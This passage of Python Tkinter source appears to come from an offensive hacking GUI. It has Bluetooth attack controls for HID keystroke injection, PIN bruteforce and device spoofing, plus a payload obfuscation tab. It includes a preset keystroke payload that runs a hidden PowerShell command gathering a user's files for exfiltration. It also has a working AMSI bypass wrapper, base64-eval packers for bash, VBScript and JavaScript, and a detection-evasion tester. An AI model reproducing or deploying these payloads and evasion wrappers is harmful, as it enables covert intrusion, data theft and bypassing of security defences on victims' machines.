        except FileNotFoundError:
            self.bt_output.insert(tk.END, "ERROR: hciconfig not found. Install bluez tools\n")
        except Exception as e:
            self.bt_output.insert(tk.END, f"ERROR detecting adapters: {e}\n")
    
    def toggle_bt_power(self):
        """Toggle Bluetooth adapter power"""
        adapter = self.bt_adapter.get()
        if not adapter:
            messagebox.showwarning("No Adapter", "Select a Bluetooth adapter first")
            return
        
        try:
            if self.bt_powered:
                subprocess.run(["sudo", "hciconfig", adapter, "down"], check=True)
                self.bt_powered = False
                self.bt_status_label.config(text="❌ Bluetooth Off", foreground="#ff0000")
                self.bt_power_btn.config(text="⚡ Power On")
                self.bt_output.insert(tk.END, f"Powered down {adapter}\n")
            else:
                subprocess.run(["sudo", "hciconfig", adapter, "up"], check=True)
                self.bt_powered = True
                self.bt_status_label.config(text="✅ Bluetooth On", foreground="#00ff00")
                self.bt_power_btn.config(text="🔌 Power Off")
                self.bt_output.insert(tk.END, f"Powered up {adapter}\n")
        except subprocess.CalledProcessError as e:
            messagebox.showerror("Error", f"Failed to toggle power: {e}")
    
    def scan_ble_devices(self):
        """Scan for BLE devices"""
        if not self.bt_powered:
            messagebox.showwarning("BT Off", "Power on Bluetooth adapter first")
            return
        
        self.bt_output.insert(tk.END, "\n[+] Starting BLE scan...\n")
        self.bt_devices_list.delete(0, tk.END)
        self.bt_scanning = True
        
        # Run scan in thread
        self.bt_scan_thread = threading.Thread(target=self._scan_ble_worker, daemon=True)
        self.bt_scan_thread.start()
    
    def _scan_ble_worker(self):
        """BLE scan worker thread"""
        try:
            # Try using bluetoothctl or hcitool
            if shutil.which("hcitool"):
                result = subprocess.run(["sudo", "hcitool", "lescan", "--duplicates"], 
                                      capture_output=True, text=True, timeout=15)
                
                devices = {}
                for line in result.stdout.split('\n'):
                    parts = line.strip().split()
                    if len(parts) >= 2 and ':' in parts[0]:
                        mac = parts[0]
                        name = ' '.join(parts[1:]) if len(parts) > 1 else "(unknown)"
                        devices[mac] = name
                
                self.after(0, self._update_bt_list, devices)
            else:
                self.bt_output.insert(tk.END, "ERROR: hcitool not found\n")
        except subprocess.TimeoutExpired:
            self.bt_output.insert(tk.END, "Scan timeout - use shorter duration\n")
        except Exception as e:
            self.bt_output.insert(tk.END, f"ERROR: {e}\n")
        finally:
            self.bt_scanning = False
    
    def scan_bt_classic(self):
        """Scan for Bluetooth Classic devices"""
        if not self.bt_powered:
            messagebox.showwarning("BT Off", "Power on Bluetooth adapter first")
            return
        
        self.bt_output.insert(tk.END, "\n[+] Starting Bluetooth Classic scan...\n")
        self.bt_devices_list.delete(0, tk.END)
        self.bt_scanning = True
        
        self.bt_scan_thread = threading.Thread(target=self._scan_classic_worker, daemon=True)
        self.bt_scan_thread.start()
    
    def _scan_classic_worker(self):
        """Classic BT scan worker"""
        try:
            result = subprocess.run(["hcitool", "scan"], capture_output=True, text=True, timeout=20)
            
            devices = {}
            for line in result.stdout.split('\n'):
                parts = line.strip().split(maxsplit=1)
                if len(parts) == 2 and ':' in parts[0]:
                    mac = parts[0]
                    name = parts[1]
                    devices[mac] = name
            
            self.after(0, self._update_bt_list, devices)
        except subprocess.TimeoutExpired:
            self.bt_output.insert(tk.END, "Scan timeout\n")
        except Exception as e:
            self.bt_output.insert(tk.END, f"ERROR: {e}\n")
        finally:
            self.bt_scanning = False
    
    def _update_bt_list(self, devices):
        """Update device list in UI"""
        self.bt_devices_list.delete(0, tk.END)
        for mac, name in devices.items():
            self.bt_devices_list.insert(tk.END, f"{mac} - {name}")
        
        self.bt_output.insert(tk.END, f"[+] Found {len(devices)} device(s)\n")
        self.bt_output.see(tk.END)
    
    def stop_bt_scan(self):
        """Stop ongoing scan"""
        if self.bt_scanning:
            try:
                subprocess.run(["sudo", "pkill", "hcitool"], timeout=5)
                self.bt_scanning = False
                self.bt_output.insert(tk.END, "[+] Scan stopped\n")
            except Exception as e:
                self.bt_output.insert(tk.END, f"ERROR stopping scan: {e}\n")
    
    def get_bt_device_info(self):
        """Get detailed info about selected device"""
        selection = self.bt_devices_list.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Select a device from the list")
            return
        
        device = self.bt_devices_list.get(selection[0])
        mac = device.split(" - ")[0]
        
        self.bt_output.insert(tk.END, f"\n[+] Querying device {mac}...\n")
        
        threading.Thread(target=self._get_device_info_worker, args=(mac,), daemon=True).start()
    
    def _get_device_info_worker(self, mac):
        """Worker to get device info"""
        try:
            result = subprocess.run(["hcitool", "info", mac], capture_output=True, text=True, timeout=10)
            self.after(0, lambda: self.bt_output.insert(tk.END, result.stdout + "\n"))
        except Exception as e:
            self.after(0, lambda: self.bt_output.insert(tk.END, f"ERROR: {e}\n"))
    
    def pair_bt_device(self):
        """Attempt to pair with selected device"""
        selection = self.bt_devices_list.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Select a device to pair with")
            return
        
        device = self.bt_devices_list.get(selection[0])
        mac = device.split(" - ")[0]
        
        pin = simpledialog.askstring("Pairing", "Enter PIN (leave empty for no PIN):", initialvalue="0000")
        
        self.bt_output.insert(tk.END, f"\n[+] Attempting to pair with {mac}...\n")
        self.bt_output.insert(tk.END, f"PIN: {pin if pin else '(none)'}\n")
        
        # In real implementation, use bluetoothctl or similar
        self.bt_output.insert(tk.END, "Use bluetoothctl for manual pairing:\n")
        self.bt_output.insert(tk.END, f"  bluetoothctl\n  pair {mac}\n")
    
    def set_bt_target(self):
        """Set selected device as attack target"""
        selection = self.bt_devices_list.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Select a target device")
            return
        
        device = self.bt_devices_list.get(selection[0])
        parts = device.split(" - ")
        mac = parts[0]
        name = parts[1] if len(parts) > 1 else "Unknown"
        
        self.bt_target_mac.delete(0, tk.END)
        self.bt_target_mac.insert(0, mac)
        
        self.bt_target_name.delete(0, tk.END)
        self.bt_target_name.insert(0, name)
        
        self.bt_output.insert(tk.END, f"\n[+] Target set: {name} ({mac})\n")
    
    def bt_hid_injection(self):
        """Launch HID injection attack"""
        target = self.bt_target_mac.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Set a target device first")
            return
        
        payload = self.bt_payload_text.get("1.0", tk.END).strip()
        if not payload:
            messagebox.showwarning("No Payload", "Enter a HID payload first")
            return
        
        self.bt_output.insert(tk.END, f"\n[!] HID INJECTION ATTACK\n")
        self.bt_output.insert(tk.END, f"Target: {target}\n")
        self.bt_output.insert(tk.END, f"Payload length: {len(payload)} chars\n\n")
        
        # Generate Bluetooth HID payload
        self.bt_output.insert(tk.END, "Converting to Bluetooth HID commands...\n")
        
        # In real implementation, this would use BT HID profile
        self.bt_output.insert(tk.END, "Use ESP32 with Bluetooth keyboard firmware\n")
        self.bt_output.insert(tk.END, "Deploy payload via USB Army Knife's BT mode\n")
    
    def bt_pin_bruteforce(self):
        """Bruteforce Bluetooth PIN"""
        target = self.bt_target_mac.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Set a target device first")
            return
        
        self.bt_output.insert(tk.END, f"\n[!] PIN BRUTEFORCE\n")
        self.bt_output.insert(tk.END, f"Target: {target}\n")
        self.bt_output.insert(tk.END, "Testing common PINs: 0000, 1234, 1111...\n")
        
        messagebox.showinfo("Attack Started", "PIN bruteforce running. This may take time.")
    
    def bt_device_spoof(self):
        """Spoof Bluetooth device identity"""
        target = self.bt_target_mac.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Select a device to clone")
            return
        
        self.bt_output.insert(tk.END, f"\n[!] DEVICE SPOOFING\n")
        self.bt_output.insert(tk.END, f"Cloning: {target}\n")
        self.bt_output.insert(tk.END, "Creating fake device with same MAC/name...\n")
        
        adapter = self.bt_adapter.get()
        if adapter:
            self.bt_output.insert(tk.END, f"Setting {adapter} address to {target}\n")
            self.bt_output.insert(tk.END, f"Command: sudo bdaddr -i {adapter} {target}\n")
    
    def bt_jamming(self):
        """Bluetooth jamming attack"""
        self.bt_output.insert(tk.END, f"\n[!] BLUETOOTH JAMMING\n")
        self.bt_output.insert(tk.END, "Generating interference on 2.4GHz band...\n")
        self.bt_output.insert(tk.END, "WARNING: This may disrupt WiFi and other devices\n")
        
        messagebox.showwarning("Jamming", "BT jamming requires specialized hardware")
    
    def bt_service_discovery(self):
        """Discover Bluetooth services"""
        target = self.bt_target_mac.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Set a target device first")
            return
        
        self.bt_output.insert(tk.END, f"\n[+] SERVICE DISCOVERY\n")
        self.bt_output.insert(tk.END, f"Target: {target}\n")
        self.bt_output.insert(tk.END, "Enumerating SDP services...\n")
        
        threading.Thread(target=self._service_discovery_worker, args=(target,), daemon=True).start()
    
    def _service_discovery_worker(self, target):
        """Worker for service discovery"""
        try:
            result = subprocess.run(["sdptool", "browse", target], capture_output=True, text=True, timeout=30)
            self.after(0, lambda: self.bt_output.insert(tk.END, result.stdout + "\n"))
        except FileNotFoundError:
            self.after(0, lambda: self.bt_output.insert(tk.END, "ERROR: sdptool not found\n"))
        except Exception as e:
            self.after(0, lambda: self.bt_output.insert(tk.END, f"ERROR: {e}\n"))
    
    def load_bt_payload(self, payload_type):
        """Load predefined Bluetooth payload"""
        self.bt_payload_text.delete("1.0", tk.END)
        
        if payload_type == "cmd":
            payload = """GUI r
DELAY 500
STRING cmd
ENTER
DELAY 300
STRING whoami
ENTER"""
        elif payload_type == "rickroll":
            payload = """GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER"""
        elif payload_type == "exfil":
            payload = """GUI r
DELAY 500
STRING powershell -w hidden -c "$d=Get-ChildItem $env:USERPROFILE -R -File;$d|Out-File C:\\exfil.txt"
ENTER"""
        else:
            payload = ""
        
        self.bt_payload_text.insert("1.0", payload)
    
    def load_bt_payload_file(self):
        """Load payload from file"""
        filepath = filedialog.askopenfilename(
            title="Select payload file",
            filetypes=[("DuckyScript", "*.ds *.txt"), ("All Files", "*.*")]
        )
        if filepath:
            with open(filepath, 'r') as f:
                payload = f.read()
            self.bt_payload_text.delete("1.0", tk.END)
            self.bt_payload_text.insert("1.0", payload)
            self.bt_output.insert(tk.END, f"Loaded payload: {filepath}\n")
    
    def execute_bt_payload(self):
        """Execute Bluetooth HID payload"""
        target = self.bt_target_mac.get().strip()
        payload = self.bt_payload_text.get("1.0", tk.END).strip()
        
        if not payload:
            messagebox.showwarning("No Payload", "Enter a payload to execute")
            return
        
        self.bt_output.insert(tk.END, f"\n[!] EXECUTING BLUETOOTH HID PAYLOAD\n")
        if target:
            self.bt_output.insert(tk.END, f"Target: {target}\n")
        self.bt_output.insert(tk.END, f"Payload: {len(payload)} characters\n\n")
        
        # Save payload for device
        os.makedirs("payloads", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        payload_file = f"payloads/BT_HID_{timestamp}.ds"
        
        with open(payload_file, 'w') as f:
            f.write(payload)
        
        self.bt_output.insert(tk.END, f"Payload saved: {payload_file}\n")
        self.bt_output.insert(tk.END, "Deploy to USB Army Knife via Flasher tab\n")
        
        messagebox.showinfo("Ready", f"Payload saved to {payload_file}\nDeploy to device to execute")
    
    def stop_bt_attack(self):
        """Stop current Bluetooth attack"""
        self.bt_attack_active = False
        self.bt_output.insert(tk.END, "\n[+] Attack stopped\n")
    
    def export_bt_log(self):
        """Export Bluetooth attack log"""
        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if filepath:
            with open(filepath, 'w') as f:
                f.write(self.bt_output.get("1.0", tk.END))
            messagebox.showinfo("Exported", f"Log saved to {filepath}")
    
    def open_bt_settings(self):
        """Open Bluetooth settings dialog"""
        settings_win = tk.Toplevel(self)
        settings_win.title("Bluetooth Settings")
        settings_win.geometry("400x300")
        
        tk.Label(settings_win, text="Bluetooth Configuration", font=("Arial", 12, "bold")).pack(pady=10)
        
        # Settings options
        settings_frame = tk.LabelFrame(settings_win, text="Options", padding=15)
        settings_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        tk.Checkbutton(settings_frame, text="Enable verbose logging").pack(anchor=tk.W, pady=5)
        tk.Checkbutton(settings_frame, text="Auto-reconnect on disconnect").pack(anchor=tk.W, pady=5)
        tk.Checkbutton(settings_frame, text="Use random MAC addresses").pack(anchor=tk.W, pady=5)
        
        tk.Label(settings_frame, text="Scan duration (seconds):").pack(anchor=tk.W, pady=(10, 2))
        scan_duration = tk.Entry(settings_frame, width=10)
        scan_duration.insert(0, "15")
        scan_duration.pack(anchor=tk.W)
        
        tk.Button(settings_win, text="Save", command=settings_win.destroy).pack(pady=10)
    
    # Payload Obfuscation & Encoding
    def create_obfuscation_tab(self):
        """Payload obfuscation and encoding for evasion"""
        obf_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(obf_frame, text="🔐 Obfuscation")
        
        # Main split view
        main_split = tk.Frame(obf_frame)
        main_split.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Left panel: Input & techniques
        left_panel = tk.Frame(main_split)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        # Input payload
        input_frame = tk.LabelFrame(left_panel, text="Original Payload", padding=10)
        input_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        input_toolbar = tk.Frame(input_frame)
        input_toolbar.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(input_toolbar, text="📂 Load File", command=self.load_obf_payload).pack(side=tk.LEFT, padx=2)
        tk.Button(input_toolbar, text="📋 Paste", command=self.paste_obf_payload).pack(side=tk.LEFT, padx=2)
        tk.Button(input_toolbar, text="🗑️ Clear", command=lambda: self.obf_input.delete("1.0", tk.END)).pack(side=tk.LEFT, padx=2)
        
        self.obf_input = scrolledtext.ScrolledText(input_frame, height=12, font=("Courier", 9), 
                                                   bg="#1a1a1a", fg="#ffffff", wrap=tk.WORD)
        self.obf_input.pack(fill=tk.BOTH, expand=True)
        
        # Encoding techniques
        techniques_frame = tk.LabelFrame(left_panel, text="Encoding Techniques", padding=10)
        techniques_frame.pack(fill=tk.X)
        
        # Technique selection grid
        tech_grid = tk.Frame(techniques_frame)
        tech_grid.pack(fill=tk.X, pady=(0, 10))
        
        self.obf_techniques = {}
        techniques = [
            ("Base64", "Standard Base64 encoding"),
            ("Hex", "Hexadecimal encoding"),
            ("ROT13", "Caesar cipher rotation"),
            ("URL", "URL encoding"),
            ("Unicode", "Unicode escape sequences"),
            ("Gzip+B64", "Compress then Base64"),
            ("XOR", "XOR encryption"),
            ("AES", "AES-256 encryption"),
        ]
        
        for i, (name, desc) in enumerate(techniques):
            var = tk.IntVar(value=0)
            self.obf_techniques[name] = var
            
            cb = tk.Checkbutton(tech_grid, text=name, variable=var)
            cb.grid(row=i//2, column=(i%2)*2, sticky=tk.W, padx=5, pady=2)
            
            tk.Label(tech_grid, text=desc, font=("Arial", 8), foreground="#888888").grid(
                row=i//2, column=(i%2)*2+1, sticky=tk.W, padx=(0, 15), pady=2)
        
        # Advanced options
        adv_frame = tk.LabelFrame(techniques_frame, text="Advanced Options", padding=8)
        adv_frame.pack(fill=tk.X, pady=(5, 0))
        
        options_grid = tk.Frame(adv_frame)
        options_grid.pack(fill=tk.X)
        
        tk.Label(options_grid, text="XOR Key:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.obf_xor_key = tk.Entry(options_grid, width=20, font=("Courier", 9))
        self.obf_xor_key.insert(0, "0x42")
        self.obf_xor_key.grid(row=0, column=1, sticky=tk.W, padx=5, pady=2)
        
        tk.Label(options_grid, text="AES Password:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.obf_aes_pass = tk.Entry(options_grid, width=20, show="*")
        self.obf_aes_pass.insert(0, "changeme")
        self.obf_aes_pass.grid(row=1, column=1, sticky=tk.W, padx=5, pady=2)
        
        tk.Label(options_grid, text="Iterations:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.obf_iterations = tk.Spinbox(options_grid, from_=1, to=10, width=10)
        self.obf_iterations.delete(0, tk.END)
        self.obf_iterations.insert(0, "1")
        self.obf_iterations.grid(row=2, column=1, sticky=tk.W, padx=5, pady=2)
        
        # Right panel: Output & actions
        right_panel = tk.Frame(main_split)
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Output payload
        output_frame = tk.LabelFrame(right_panel, text="Obfuscated Output", padding=10)
        output_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        output_toolbar = tk.Frame(output_frame)
        output_toolbar.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(output_toolbar, text="💾 Save", command=self.save_obf_output).pack(side=tk.LEFT, padx=2)
        tk.Button(output_toolbar, text="📋 Copy", command=self.copy_obf_output).pack(side=tk.LEFT, padx=2)
        tk.Button(output_toolbar, text="🔄 Decode", command=self.decode_obf_payload).pack(side=tk.LEFT, padx=2)
        
        self.obf_output = scrolledtext.ScrolledText(output_frame, height=12, font=("Courier", 9),
                                                    bg="#0a0a0a", fg="#00ff00", wrap=tk.WORD)
        self.obf_output.pack(fill=tk.BOTH, expand=True)
        
        # Stats panel
        stats_frame = tk.LabelFrame(right_panel, text="Statistics", padding=10)
        stats_frame.pack(fill=tk.X, pady=(0, 10))
        
        stats_grid = tk.Frame(stats_frame)
        stats_grid.pack(fill=tk.X)
        
        tk.Label(stats_grid, text="Original Size:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.obf_orig_size = tk.Label(stats_grid, text="0 bytes", font=("Courier", 9))
        self.obf_orig_size.grid(row=0, column=1, sticky=tk.W, padx=10, pady=2)
        
        tk.Label(stats_grid, text="Encoded Size:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.obf_enc_size = tk.Label(stats_grid, text="0 bytes", font=("Courier", 9))
        self.obf_enc_size.grid(row=1, column=1, sticky=tk.W, padx=10, pady=2)
        
        tk.Label(stats_grid, text="Size Change:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.obf_size_change = tk.Label(stats_grid, text="0%", font=("Courier", 9))
        self.obf_size_change.grid(row=2, column=1, sticky=tk.W, padx=10, pady=2)
        
        tk.Label(stats_grid, text="Entropy:").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.obf_entropy = tk.Label(stats_grid, text="N/A", font=("Courier", 9))
        self.obf_entropy.grid(row=3, column=1, sticky=tk.W, padx=10, pady=2)
        
        # Evasion templates
        template_frame = tk.LabelFrame(right_panel, text="Evasion Templates", padding=10)
        template_frame.pack(fill=tk.X)
        
        template_btns = [
            ("🪟 PowerShell Bypass", self.gen_powershell_bypass),
            ("🐚 Bash Obfuscation", self.gen_bash_obfuscation),
            ("📜 VBScript Encoder", self.gen_vbscript_encoder),
            ("☕ JavaScript Packer", self.gen_javascript_packer),
        ]
        
        for name, cmd in template_btns:
            tk.Button(template_frame, text=name, command=cmd, width=25).pack(side=tk.LEFT, padx=3)
        
        # Action buttons
        action_frame = tk.Frame(obf_frame)
        action_frame.pack(fill=tk.X)
        
        tk.Button(action_frame, text="🔐 Obfuscate", command=self.obfuscate_payload, 
                 style="Action.TButton").pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="🔬 Analyze", command=self.analyze_obfuscation).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="🧪 Test Evasion", command=self.test_evasion).pack(side=tk.LEFT, padx=5)
        tk.Button(action_frame, text="📊 Entropy Graph", command=self.show_entropy_graph).pack(side=tk.LEFT, padx=5)
        
        # Console output
        console_frame = tk.LabelFrame(obf_frame, text="Processing Log", padding=10)
        console_frame.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        
        self.obf_console = scrolledtext.ScrolledText(console_frame, height=6, bg="#0a0a0a", fg="#00ff00",
                                                     font=("Courier", 9), insertbackground="#00ff00", wrap=tk.WORD)
        self.obf_console.pack(fill=tk.BOTH, expand=True)
    
    def load_obf_payload(self):
        """Load payload file for obfuscation"""
        filepath = filedialog.askopenfilename(
            title="Select payload file",
            filetypes=[("All Files", "*.*"), ("Scripts", "*.ps1 *.sh *.vbs *.js"), ("DuckyScript", "*.ds")]
        )
        if filepath:
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    content = f.read()
                self.obf_input.delete("1.0", tk.END)
                self.obf_input.insert("1.0", content)
                self.obf_console.insert(tk.END, f"Loaded: {filepath}\n")
                self.update_obf_stats()
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load file: {e}")
    
    def paste_obf_payload(self):
        """Paste from clipboard"""
        try:
            content = self.clipboard_get()
            self.obf_input.delete("1.0", tk.END)
            self.obf_input.insert("1.0", content)
            self.obf_console.insert(tk.END, "Pasted from clipboard\n")
            self.update_obf_stats()
        except Exception as e:
            messagebox.showwarning("Clipboard", "No text in clipboard")
    
    def obfuscate_payload(self):
        """Apply selected obfuscation techniques"""
        input_text = self.obf_input.get("1.0", tk.END).strip()
        if not input_text:
            messagebox.showwarning("No Input", "Enter payload to obfuscate")
            return
        
        self.obf_console.insert(tk.END, "\n[+] Starting obfuscation...\n")
        result = input_text.encode('utf-8')
        iterations = int(self.obf_iterations.get())
        
        # Get selected techniques
        selected = [name for name, var in self.obf_techniques.items() if var.get() == 1]
        
        if not selected:
            messagebox.showwarning("No Techniques", "Select at least one obfuscation technique")
            return
        
        try:
            for iteration in range(iterations):
                self.obf_console.insert(tk.END, f"Iteration {iteration + 1}/{iterations}\n")
                
                for technique in selected:
                    self.obf_console.insert(tk.END, f"  Applying {technique}...\n")
                    result = self._apply_obfuscation(result, technique)
                    self.obf_console.see(tk.END)
            
            # Convert to string for display
            try:
                output_text = result.decode('utf-8')
            except:
                output_text = result.hex()
            
            self.obf_output.delete("1.0", tk.END)
            self.obf_output.insert("1.0", output_text)
            
            self.obf_console.insert(tk.END, "[+] Obfuscation complete!\n")
            self.update_obf_stats()
            
        except Exception as e:
            messagebox.showerror("Error", f"Obfuscation failed: {e}")
            self.obf_console.insert(tk.END, f"ERROR: {e}\n")
    
    def _apply_obfuscation(self, data, technique):
        """Apply specific obfuscation technique"""
        if technique == "Base64":
            return base64.b64encode(data)
        
        elif technique == "Hex":
            return data.hex().encode('utf-8')
        
        elif technique == "ROT13":
            import codecs
            text = data.decode('utf-8', errors='ignore')
            return codecs.encode(text, 'rot13').encode('utf-8')
        
        elif technique == "URL":
            import urllib.parse
            text = data.decode('utf-8', errors='ignore')
            return urllib.parse.quote(text).encode('utf-8')
        
        elif technique == "Unicode":
            text = data.decode('utf-8', errors='ignore')
            encoded = ''.join(f'\\u{ord(c):04x}' for c in text)
            return encoded.encode('utf-8')
        
        elif technique == "Gzip+B64":
            import gzip
            compressed = gzip.compress(data)
            return base64.b64encode(compressed)
        
        elif technique == "XOR":
            key = int(self.obf_xor_key.get(), 0)
            return bytes([b ^ key for b in data])
        
        elif technique == "AES":
            if CRYPTO_AVAILABLE:
                password = self.obf_aes_pass.get().encode()
                salt = os.urandom(16)
                kdf = PBKDF2HMAC(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=salt,
                    iterations=100000,
                )
                key = base64.urlsafe_b64encode(kdf.derive(password))
                f = Fernet(key)
                encrypted = f.encrypt(data)
                return salt + encrypted
            else:
                raise Exception("cryptography library not installed")
        
        return data
    
    def decode_obf_payload(self):
        """Attempt to decode obfuscated payload"""
        encoded = self.obf_output.get("1.0", tk.END).strip()
        if not encoded:
            messagebox.showwarning("No Output", "No obfuscated payload to decode")
            return
        
        self.obf_console.insert(tk.END, "\n[+] Attempting to decode...\n")
        
        # Try different decodings
        decoders = [
            ("Base64", lambda x: base64.b64decode(x)),
            ("Hex", lambda x: bytes.fromhex(x)),
            ("URL", lambda x: urllib.parse.unquote(x).encode()),
        ]
        
        for name, decoder in decoders:
            try:
                decoded = decoder(encoded)
                decoded_text = decoded.decode('utf-8', errors='ignore')
                self.obf_input.delete("1.0", tk.END)
                self.obf_input.insert("1.0", decoded_text)
                self.obf_console.insert(tk.END, f"[+] Decoded using {name}\n")
                return
            except Exception:
                continue
        
        self.obf_console.insert(tk.END, "[!] Could not automatically decode\n")
    
    def update_obf_stats(self):
        """Update statistics display"""
        import math
        from collections import Counter
        
        orig_text = self.obf_input.get("1.0", tk.END).strip()
        enc_text = self.obf_output.get("1.0", tk.END).strip()
        
        orig_size = len(orig_text.encode('utf-8'))
        enc_size = len(enc_text.encode('utf-8')) if enc_text else 0
        
        self.obf_orig_size.config(text=f"{orig_size} bytes")
        self.obf_enc_size.config(text=f"{enc_size} bytes")
        
        if orig_size > 0:
            change = ((enc_size - orig_size) / orig_size) * 100
            self.obf_size_change.config(text=f"{change:+.1f}%")
        
        # Calculate entropy
        if orig_text:
            counter = Counter(orig_text)
            length = len(orig_text)
            entropy = -sum((count/length) * math.log2(count/length) for count in counter.values())
            self.obf_entropy.config(text=f"{entropy:.2f} bits")
    
    def save_obf_output(self):
        """Save obfuscated output"""
        content = self.obf_output.get("1.0", tk.END).strip()
        if not content:
            messagebox.showwarning("No Output", "Nothing to save")
            return
        
        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if filepath:
            with open(filepath, 'w') as f:
                f.write(content)
            self.obf_console.insert(tk.END, f"Saved to: {filepath}\n")
            messagebox.showinfo("Saved", f"Output saved to {filepath}")
    
    def copy_obf_output(self):
        """Copy output to clipboard"""
        content = self.obf_output.get("1.0", tk.END).strip()
        if content:
            self.clipboard_clear()
            self.clipboard_append(content)
            self.obf_console.insert(tk.END, "Copied to clipboard\n")
        else:
            messagebox.showwarning("No Output", "Nothing to copy")
    
    def gen_powershell_bypass(self):
        """Generate PowerShell AMSI/ETW bypass"""
        payload = self.obf_input.get("1.0", tk.END).strip()
        if not payload:
            messagebox.showwarning("No Input", "Enter PowerShell payload first")
            return
        
        # Encode payload
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        
        # Generate bypass wrapper
        wrapper = f'''# AMSI Bypass
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){{if($b.Name-like"*iUtils"){{$c=$b}}}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){{if($e.Name-like"*Context"){{$f=$e}}}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# Execute encoded payload
powershell.exe -enc {encoded}
'''
        
        self.obf_output.delete("1.0", tk.END)
        self.obf_output.insert("1.0", wrapper)
        self.obf_console.insert(tk.END, "Generated PowerShell bypass wrapper\n")
        self.update_obf_stats()
    
    def gen_bash_obfuscation(self):
        """Generate obfuscated bash script"""
        payload = self.obf_input.get("1.0", tk.END).strip()
        if not payload:
            messagebox.showwarning("No Input", "Enter bash script first")
            return
        
        # Base64 encode and wrap
        encoded = base64.b64encode(payload.encode()).decode()
        
        wrapper = f'''#!/bin/bash
# Obfuscated bash script
eval "$(echo '{encoded}' | base64 -d)"
'''
        
        self.obf_output.delete("1.0", tk.END)
        self.obf_output.insert("1.0", wrapper)
        self.obf_console.insert(tk.END, "Generated obfuscated bash script\n")
        self.update_obf_stats()
    
    def gen_vbscript_encoder(self):
        """Generate encoded VBScript"""
        payload = self.obf_input.get("1.0", tk.END).strip()
        if not payload:
            messagebox.showwarning("No Input", "Enter VBScript first")
            return
        
        # Simple character code obfuscation
        encoded_lines = []
        for line in payload.split('\n'):
            if line.strip():
                char_codes = '+'.join(f'Chr({ord(c)})' for c in line)
                encoded_lines.append(f'Execute({char_codes})')
        
        wrapper = '\n'.join(encoded_lines)
        
        self.obf_output.delete("1.0", tk.END)
        self.obf_output.insert("1.0", wrapper)
        self.obf_console.insert(tk.END, "Generated encoded VBScript\n")
        self.update_obf_stats()
    
    def gen_javascript_packer(self):
        """Generate packed JavaScript"""
        payload = self.obf_input.get("1.0", tk.END).strip()
        if not payload:
            messagebox.showwarning("No Input", "Enter JavaScript first")
            return
        
        # Simple eval-based packing
        encoded = base64.b64encode(payload.encode()).decode()
        
        wrapper = f'''(function(){{eval(atob("{encoded}"))}})();'''
        
        self.obf_output.delete("1.0", tk.END)
        self.obf_output.insert("1.0", wrapper)
        self.obf_console.insert(tk.END, "Generated packed JavaScript\n")
        self.update_obf_stats()
    
    def analyze_obfuscation(self):
        """Analyze obfuscation quality"""
        output = self.obf_output.get("1.0", tk.END).strip()
        if not output:
            messagebox.showwarning("No Output", "No obfuscated payload to analyze")
            return
        
        self.obf_console.insert(tk.END, "\n[+] ANALYSIS RESULTS:\n")
        
        # Check for common patterns
        patterns = [
            (r'powershell', 'PowerShell keyword detected'),
            (r'cmd\.exe', 'CMD reference found'),
            (r'http[s]?://', 'URL pattern detected'),
            (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', 'Email pattern found'),
            (r'eval|exec|system', 'Dangerous function names visible'),
        ]
        
        import re
        detections = 0
        for pattern, message in patterns:
            if re.search(pattern, output, re.IGNORECASE):
                self.obf_console.insert(tk.END, f"  [!] {message}\n")
                detections += 1
        
        if detections == 0:
            self.obf_console.insert(tk.END, "  [+] No obvious patterns detected\n")
        else:
            self.obf_console.insert(tk.END, f"  [!] {detections} suspicious pattern(s) found\n")
        
        # Entropy check
        self.update_obf_stats()
        entropy_text = self.obf_entropy.cget("text")
        self.obf_console.insert(tk.END, f"  Entropy: {entropy_text}\n")
        
        self.obf_console.insert(tk.END, "[+] Analysis complete\n")
    
    def test_evasion(self):
        """Test evasion against common detections"""
        output = self.obf_output.get("1.0", tk.END).strip()
        if not output:
            messagebox.showwarning("No Output", "No payload to test")
            return
        
        self.obf_console.insert(tk.END, "\n[+] EVASION TEST:\n")
        
        # Simulated detection checks
        checks = [
            ("Signature-based", lambda: 'powershell' not in output.lower()),
